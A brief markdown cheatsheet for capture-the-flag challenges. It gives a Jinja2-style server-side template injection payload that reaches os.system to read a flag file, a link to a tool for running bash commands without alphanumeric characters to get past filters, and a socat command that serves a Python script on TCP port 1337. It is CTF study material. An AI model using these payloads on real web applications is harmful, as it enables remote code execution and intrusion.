# Bash And CTF Cheatsheet

## Server Side Template Injection
```bash
{{ ().__class__.__base__.__subclasses__()[59].__init__.func_globals["linecache"].__dict__["os"].system('cat flag.txt') }}
```


## Bash Hack

### Bashfuck
Executing command without using alphanum characters

[BasFuck](https://github.com/trichimtrich/bashfuck)

### Socat

```bash
socat -d -d -d TCP4-LISTEN:1337,reuseaddr,fork EXEC:"python pwn.py" > /dev/null 2>&1 &
```